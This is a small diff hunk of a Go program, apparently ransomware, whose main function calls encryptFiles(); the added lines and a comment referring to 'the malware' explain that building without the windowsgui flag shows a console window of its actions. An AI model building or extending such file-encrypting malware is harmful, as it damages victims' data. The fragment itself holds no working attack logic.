@@ -37,6 +37,14 @@ func main() {
 	cmd.CheckOS()
 
 	encryptFiles()
+
+	// If you compile this program without -ldflags "-H windowsgui"
+	// you can see a console window with all actions perfformed by
+	// the malware. Otherwise, the lines above will be ignored
+	// If in console mode, wait for enter to close the window
+	var s string
+	fmt.Println("Press enter to quit")
+	fmt.Scanf("%s", &s)
 }
 
 func encryptFiles() {
